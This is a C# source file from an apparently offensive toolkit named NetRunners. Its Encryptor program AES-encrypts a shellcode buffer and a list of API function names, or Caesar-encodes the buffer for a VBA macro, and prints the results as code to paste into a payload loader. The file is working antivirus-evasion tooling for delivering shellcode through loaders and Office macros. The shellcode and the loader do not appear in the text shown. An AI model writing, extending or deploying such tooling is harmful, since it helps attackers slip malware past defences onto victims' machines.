﻿using CommandLine;
using System;
using System.Text;
using static NetRunners.Encryptor.Printers.Printer;
using static NetRunners.Encryptor.Data.Data;
using static NetRunners.Encryptor.EncryptionAlgorithms.Encryptor;

namespace NetRunners.Encryptor
{
    // params
    public class Options
    {
        [Option('m', "macro", Required = false, HelpText = "Encrypted hellcode gets formated in decimal notation for use in VBA macro.")]
        public bool macro { get; set; }

        [Option("x86", Required = false, HelpText = "Print x86 encrypted payload.")]
        public bool x86 { get; set; }
    }
    /// <summary>
    /// Entry point Encryptor, checks for arguments, prints decryption key and encrypted data.
    /// If no argument is supplied, program prints encrypted data + x86 shellcode in csharp format for use within netrunners.
    /// </summary>
    class Program
    {
        static void Main(string[] args)
        {
            // check args number
            if (args.Length > 1)
            {
                Console.WriteLine("Error: Only one argument is allowed max.");
                return;
            }

            // check arguments, case insensitive
            string call = args.Length == 1 ? args[0] : string.Empty;

            byte[] encrypted;
            //byte[] XorKey = new byte[4];
            byte[] AesIV = GenerateIV_Aes();
            byte[] AesKey = GenerateKey_Aes();

            switch (call.ToLower())
            {
                // visualbasic 
                case "-vba":
                    // generate random caesar substitution key
                    Random rnd = new Random();
                    int CaesarKey = rnd.Next(101, 999);

                    // print substitution key
                    Console.WriteLine($"key = {CaesarKey}");

                    encrypted = EncryptBytesToBytes_Caesar(buf, CaesarKey);
                    Console.Write($"buf = ");
                    PrintBytesToDec(encrypted);
                    break;
                // csharp
                default:
                    // print aes key
                    Console.Write($"public static byte[] AesKey = ");
                    PrintBytesToHex(AesKey);

                    // print IV
                    Console.Write($"public static byte[] AesIV = ");
                    PrintBytesToHex(AesIV);

                    // encrypt buf and print
                    encrypted = EncryptBytesToBytes_Aes(buf, AesKey, AesIV);
                    Console.Write("public static byte[] buf = ");
                    PrintBytesToHex(encrypted);
                    // print decrypted buf size
                    Console.Write($"public static int sBuf = ");
                    Console.WriteLine($"{buf.Length};");

                    // encrypt and print all strings
                    for (int i = 0; i < FunctionNames.Length; i++) 
                    {
                        byte[] FunctionNameBytes = Encoding.UTF8.GetBytes(FunctionNames[i]);
                        encrypted = EncryptBytesToBytes_Aes(FunctionNameBytes, AesKey, AesIV);
                        Console.Write($"public static byte[] {FunctionNames[i].Replace(".", "")}_Byte = ");
                        PrintBytesToHex(encrypted);
                    }
                    break;
            }
            return;
        }
    }
}
